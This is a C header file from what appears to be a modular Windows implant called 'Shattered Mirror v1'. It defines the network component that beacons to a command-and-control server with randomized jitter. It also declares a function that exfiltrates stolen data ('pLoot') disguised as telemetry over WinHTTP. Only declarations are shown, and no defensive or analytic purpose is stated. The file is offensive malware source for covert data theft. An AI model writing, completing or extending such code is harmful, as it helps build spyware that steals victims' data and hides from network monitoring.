#pragma once
/*=============================================================================
 * Shattered Mirror v1 — Atom 01: Network Communicator
 *
 * This Atom handles all outbound C2 connection. 
 * Other Atoms send data to it via IPC (via the Orchestrator), and this 
 * Atom uses WinHTTP to disguise the data as telemetry and beacon out.
 *===========================================================================*/

#ifndef SMIRROR_ATOM_01_NET_H
#define SMIRROR_ATOM_01_NET_H

#include <windows.h>
#include <winhttp.h>

/* Configuration Structure for the Network Atom */
typedef struct _NET_CONFIG {
    WCHAR   szC2Domain[256];
    INTERNET_PORT wPort;
    DWORD   dwJitterMin;
    DWORD   dwJitterMax;
    BYTE    PskSeed[32];      /* Seed for PSK generation */
    DWORD   dwAtomId;         /* Our ID for IPC connection */
} NET_CONFIG, *PNET_CONFIG;

/* Initialize and run the network beacon loop */
DWORD WINAPI NetworkAtomMain(LPVOID lpParam);

/* Generate current time-based PSK (HMAC-SHA256 placeholder logic) */
void GenerateCurrentPSK(const BYTE* pSeed, BYTE* pOutPsk);

/* Disguise and send payload to C2 */
BOOL ExfiltrateTelemetry(const BYTE* pLoot, DWORD dwLength, const WCHAR* szDomain, INTERNET_PORT wPort);

#endif /* SMIRROR_ATOM_01_NET_H */
